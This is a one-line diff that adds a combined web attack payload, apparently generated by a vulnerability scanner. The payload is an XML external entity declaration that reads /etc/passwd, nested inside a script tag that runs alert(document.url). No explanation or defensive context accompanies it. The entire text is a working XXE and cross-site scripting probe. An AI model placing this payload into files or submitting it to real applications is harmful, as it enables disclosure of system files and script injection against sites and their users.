@@ -1,0 +1,1 @@
+<!DOCTYPE foo [<!ENTITY xxe49078 SYSTEM "file:///etc/passwd"> ]></code> <script> alert(document.url)&xxe49078;</script><code>
